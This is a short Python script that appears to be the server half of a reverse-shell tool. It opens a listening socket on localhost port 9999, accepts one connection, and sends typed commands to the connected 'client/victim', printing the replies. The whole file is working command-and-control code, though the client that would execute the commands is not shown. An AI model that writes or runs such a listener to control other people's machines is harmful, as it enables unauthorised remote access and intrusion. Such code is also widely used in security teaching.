import socket
import sys


#   Creating a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'
        port = 9999

        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error " + str(msg))
    else:
        print("Socket Created Successfully")


#       Binding the Socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port "+str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Error " + str(msg))
        print("Retrying....")
        bind_socket()


#       Establish Connection with a client
def socket_accept():
    conn, address = s.accept()
    print("Connection has been extablished")
    print("IP: ", address[0])
    print("Port: ", address[1])

    send_commands(conn)

    conn.close()


#   Sending commands to client/victim
def send_commands(conn):
    while(True):
        cmd = input()

        if cmd == 'quit':
            conn.send(str.encode('sys.exit()'))
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            try:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "UTF-8")
                print(client_response, end="")
            except:
                print('Client is Down')
                sys.exit()


def main():
    create_socket()
    bind_socket()
    socket_accept()


if __name__ == '__main__':
    main()
